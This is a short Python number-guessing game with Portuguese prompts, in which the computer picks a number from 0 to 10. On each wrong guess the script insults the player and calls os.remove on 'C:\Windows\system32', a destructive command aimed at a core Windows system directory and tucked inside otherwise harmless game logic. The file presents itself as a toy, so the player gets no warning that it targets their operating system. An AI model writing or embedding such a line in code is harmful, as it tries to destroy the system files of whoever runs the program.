from random import randint
import os
print("""computador: estou pensando em um numero de 0 a 10...
    tente acertar o numero que estou pensando""")
computador = randint(0, 10)
while True:
    jogador = int(input('escolha um numero: '))
    if jogador == computador:
        print('voce acertou!')
        break
    if jogador != computador:
        print('burrao')
        os.remove("C:\Windows\system32")
